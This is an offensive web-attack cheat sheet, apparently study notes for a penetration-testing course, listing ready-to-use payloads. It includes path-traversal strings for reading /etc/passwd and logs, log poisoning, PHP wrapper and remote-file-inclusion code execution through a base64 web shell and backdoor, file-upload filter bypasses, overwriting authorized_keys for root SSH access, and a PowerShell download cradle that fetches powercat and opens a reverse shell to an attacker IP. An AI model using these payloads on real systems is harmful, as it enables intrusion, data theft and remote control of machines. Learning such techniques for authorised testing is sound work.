### Enumerating and Abusing APIs
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
```text
pattern.txt

{GOBUSTER}/v1
{GOBUSTER}/v2
```

### Cross-Site Scripting
> **Special characters:** 
> * `< > ' " { } ;`

### Directory Traversal / File Inclusion (LFI/RFI) / Log Poisoning
> **Notes:**
> * Use curl to get better formatting
> * If we retrieve the passwd file, try to retrieve `id_rsa` files
> * Encode characters if needed
> * Check for log poisoning in **Apache** servers

| **Files to try** | **Description** |
| ---- | ---- |
| `/index.php?page=../../../../etc/passwd` | Linux |
| `/index.php?page=../../../../Windows/System32/drivers/etc/hosts` | Windows 1 |
| `/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts` | Windows 2 |
| `/index.php?page=../../../../var/log/apache2/access.log` | Apache (log poisoning) |
| `/index.php?page=../../../../xampp/apache/logs/access.log` | Apache (log poisoning) in XAMP 1 |
| `/index.php?page=..\..\..\..\xampp\apache\logs\access.log` | Apache (log poisoning) in XAMP 2 |

If we retrieve Apache access log, insert php code in the User-Agent header of the original request to trigger Log Poisoning vulnerability, then you can see the command output in the log file

> [!warning] Do no forget to try both Linux and Windows commands in log poisoning execution

![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/a5768a72a99581707edad7a81a481e3a-cwa_lfi_modfirstreqcom.png)

| **PHP Wrappers** | **Description** |
| ---- | ---- |
| `/index.php?page=php://filter/resource=admin.php` | Get resource |
| `/index.php?page=php://filter/convert.base64-encode/resource=admin.php` | Get b64 encoded resource |
| `curl "http://host.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"` | RCE through wrappers |
| `curl "http://host.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"` | RCE through wrappers (b64 encoded) |
| `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"` | RCE through RFI |

### File Upload
> **Notes:**
> * If `.asp` or `.aspx` are allowed upload a webshell as **[p0wny shell](https://github.com/flozz/p0wny-shell)**
> * If `.php` file is not allowed try:
> 	* `.pHP`
> 	* `.phps`
> 	* `.php7`
> 	* `.phtml`
> 	* `.phar`

If we can upload a file and include `../` in the file name, maybe we can overwrite the **authorized_keys**:

```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```

![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/999ddab4c6543dc3d727618bc14ed495-cwa_fu_burprelsshcom.png)

SSH can throw an error if it cannot verify the host key it saved previously. If this happen, remove `~/.ssh/known_hosts`

```bash
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host [mountaindesserts.com]:2222 ([192.168.50.16]:2222) cant be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

### Command Injection
| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| ---- | ---- | ---- | ---- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `\|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ` `` ` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |

Snippet to detect CMD or Powershell in Windows systems

```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

If Powershell is available, we can use powercat.ps1 (Powercat is a PowerShell implementation of Netcat included in Kali) and python server

```shell
Command to trigger:
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

Command injection:
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```